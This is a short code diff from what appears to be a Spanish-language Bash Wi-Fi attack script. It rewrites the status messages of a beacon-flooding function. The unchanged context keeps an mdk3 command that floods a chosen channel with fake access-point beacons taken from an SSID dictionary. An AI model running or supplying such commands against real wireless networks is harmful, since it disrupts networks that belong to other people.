@@ -129,8 +129,7 @@ beacon_attack(){
     echo -e "\n${GREEN}[*]${RESET} Diccionario creado con exito!\n"
     clear
     banner
-    echo -e "\n${CYAN}[*]${RESET} Ataque Beacon Flooding en curso a la red ${YELLOW}${selected_essid}${RESET} en el canal ${YELLOW}${selected_channel}${RESET}\n"
-    echo -e "\n${YELLOW}[*] Ctrl + C para parar${RESET}"
+    echo -e "\n${CYAN}[*]${RESET} Ataque en curso a la red ${YELLOW}${selected_essid}${RESET} ${RED}(Ctrl + C)${RESET} para finalizar\n"
     mdk3 $interface b -f ssid_dict.txt -c $selected_channel -s 1000 -a
 }
 
